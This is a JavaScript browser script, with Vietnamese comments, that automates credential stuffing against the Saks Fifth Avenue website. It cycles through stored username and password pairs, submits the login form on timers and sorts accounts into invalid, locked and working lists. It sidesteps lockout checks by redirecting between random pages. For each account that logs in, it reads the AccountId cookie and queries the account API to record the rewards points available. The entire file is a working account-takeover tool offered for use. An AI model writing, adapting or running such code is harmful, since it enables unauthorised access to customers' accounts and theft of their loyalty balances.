var data_input = JSON.parse(localStorage.getItem('data_input'));

var data_lock = JSON.parse(localStorage.getItem('data_lock'));

var data_invalid = JSON.parse(localStorage.getItem('data_invalid'));

var data_checked = JSON.parse(localStorage.getItem('data_checked'));

const url = [
    '/account/register',
    '/Entry.jsp',
    '/account/forgot-password',
]

var rand = url[Math.floor(Math.random() * url.length)];

function login(){
    var username = data_input[0][0];
    var password = data_input[0][1];
    setTimeout(() => {

        document.querySelector('#sign-into-account-email-field').value = username;
        document.querySelector('#sign-into-account-password-field').value = password;

        data_input.shift()
        data_checked.push([username, password])

        localStorage.setItem('data_input', JSON.stringify(data_input));
        localStorage.setItem('data_checked', JSON.stringify(data_checked));

        var number = setInterval(() => {
            if(!document.querySelector('.account__alert'))
                document.querySelector('.sign-into-account__submit-button').click();
        }, 2000)   
        setTimeout(() => {
            if(document.querySelector('.sign-in__account-locked')){

                data_lock.push([username, password])
                localStorage.setItem('data_lock', JSON.stringify(data_lock));
                document.location.pathname = rand
                var win = window.open(url[Math.floor(Math.random() * url.length)], '_blank');
                win.close()
                window.clearInterval(number);

            } else if(document.querySelector('.account__alert')){

                data_invalid.push([username, password])
                localStorage.setItem('data_invalid', JSON.stringify(data_invalid));
                window.clearInterval(number);     
                document.location.pathname = rand
                var win = window.open(url[Math.floor(Math.random() * url.length)], '_blank');
                win.close()

            } else if(!document.querySelector('.account-header__greeting')){

                data_input.push([username, password]);
                localStorage.setItem('data_input', JSON.stringify(data_input));
                data_checked.pop();
                localStorage.setItem('data_checked', JSON.stringify(data_checked));  
                window.clearInterval(number);     
                           
                document.location.pathname = rand
                var win = window.open(url[Math.floor(Math.random() * url.length)], '_blank');
                win.close()

            }
        },7000) //  thoi gian cho truoc khi check xem login duoc hay khong, mac dinh 7s
    }, 5000) // thoi gian cho trc khi dien mat khau va email de login, giam xuong neu muon tang toc, hien tai la 5s
    setTimeout(() => document.location.reload(), 10000);
}

if(document.location.pathname=='/account/login' && data_input.length > 0){
    login()    
}

if(document.location.pathname == "/Entry.jsp"){

    document.location.pathname = '/account/login';
}
if(document.location.pathname == "/account/register"){

    document.location.pathname = '/account/login';
}
if(document.location.pathname == "/account/forgot-password"){

    document.location.pathname = '/account/login';
}

if(document.location.pathname == '/account/summary') {

    if(data_checked.length == 0 || data_checked[data_checked.length - 1].length == 2){

        var cookie = [];
        document.cookie.split('; ').forEach(ele => {

            ele = ele.split('=');
            cookie.push({
                key: ele[0],
                value: ele[1]
            })
        })
    
        var user_id = cookie.filter(ele => {

            return ele.key == "AccountId"
        })[0].value
        document.location.href = 'https://www.saksfifthavenue.com/v1/account-service/accounts/' + user_id + '/summary';

    } else if (data_checked[data_checked.length - 1].length == 3){

        setTimeout(() => {
            document.querySelector('.account-signout').click();
        }, 3000)

    } else {

        alert('please check again: ' + JSON.stringify(data_checked[data_checked.length - 1]));

    }
}


if(document.location.pathname.match(/\/v1\/account-service[^]*/)){

    var data = JSON.parse(document.querySelector('body pre').textContent);

    point = data.response.results.rewards.member_info.available_points;
    data_checked[data_checked.length - 1].push(point);
    localStorage.setItem('data_checked', JSON.stringify(data_checked));
    document.location.href = 'https://www.saksfifthavenue.com/account/summary';

}
